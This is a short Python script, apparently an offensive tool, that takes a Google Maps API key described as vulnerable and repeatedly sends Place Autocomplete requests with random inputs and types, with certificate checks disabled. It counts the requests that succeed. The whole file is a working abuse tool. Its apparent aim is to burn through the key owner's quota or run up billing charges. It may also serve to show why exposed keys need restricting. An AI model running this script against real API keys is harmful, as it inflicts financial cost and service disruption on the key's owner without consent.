#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama
from string import ascii_lowercase
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def get_type():
    type = open("datasets/gmap_types.txt","r")
    type_line = next(type)

    for i, t_line in enumerate(type,2):
        if random.randrange(i):
            continue
        type_line = t_line

    return type_line

def generate_url(apikey, type):
   phrase = "".join(random.choices(ascii_lowercase, k=3))
   return f"https://maps.googleapis.com/maps/api/place/autocomplete/json?input={phrase}&types={type}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to autocomplete: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey, get_type())
        response = requests.get(url, verify=False)
        if response.text.find("error_message") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()

